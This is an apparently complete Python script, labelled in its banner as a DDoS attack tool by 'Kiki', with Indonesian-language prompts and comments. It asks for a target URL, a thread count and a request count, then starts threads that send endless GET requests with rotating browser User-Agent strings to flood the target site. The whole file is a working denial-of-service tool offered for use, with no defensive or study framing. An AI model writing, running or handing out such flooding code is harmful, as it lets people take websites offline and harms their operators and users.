#!/usr/bin/env python3

import os
import requests
import threading
import random
import time

# Warna
G = "\033[1;32m"  # Hijau
R = "\033[1;31m"  # Merah
C = "\033[0m"     # Reset

# Banner
def banner():
    os.system("clear")
    print(G + """
██║ ██╔╝██║╚██╗██╔╝██║
█████╔╝ ██║ ╚███╔╝ ██║
██╔═██╗ ██║ ██╔██╗ ██║
██║  ██╗██║██╔╝ ██╗██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝

╔═════════════════════════════════╗
║     TOOLS DDOS ATTACK BY KIKI   ║
║                                 
╚═════════════════════════════════╝
""" + C)

ua_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 11)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
]

def attack(target, per_thread):
    while True:
        try:
            headers = {"User-Agent": random.choice(ua_list)}
            for _ in range(per_thread):
                r = requests.get(target, headers=headers, timeout=5)
                print(f"{G}[+] Serang {target} → {r.status_code}{C}")
        except Exception as e:
            print(f"{R}[-] Gagal: {e}{C}")

def main():
    banner()
    target = input("🌐 Target: ")
    if not target.startswith("http"):
        target = "https://" + target
    threads = int(input("🚀 Jumlah thread: "))
    per_thread = int(input("🔁 Request per thread: "))
    print(f"\n{G}[•] Menyerang {target} dengan {threads} thread × {per_thread} req...{C}")
    time.sleep(1)

    for _ in range(threads):
        threading.Thread(target=attack, args=(target, per_thread)).start()

if __name__ == "__main__":
    main()
